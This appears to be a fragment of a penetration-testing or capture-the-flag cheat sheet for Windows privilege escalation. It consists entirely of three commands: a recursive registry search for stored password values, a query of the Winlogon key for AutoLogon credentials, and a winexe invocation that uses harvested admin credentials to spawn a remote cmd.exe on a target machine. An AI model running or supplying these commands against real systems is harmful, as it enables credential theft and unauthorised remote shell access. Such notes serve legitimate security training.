
1. **Search for Passwords in the Registry:**
   ```plaintext
   reg query HKLM /f password /t REG_SZ /s
   ```

2. **Targeted Query for AutoLogon Credentials:**
   ```plaintext
   reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
   ```

3. **Use Password with Winexe:**
   ```plaintext
   winexe -U 'admin%password' //MACHINE_IP cmd.exe
   ```
   - Spawns a command prompt with admin privileges.

---
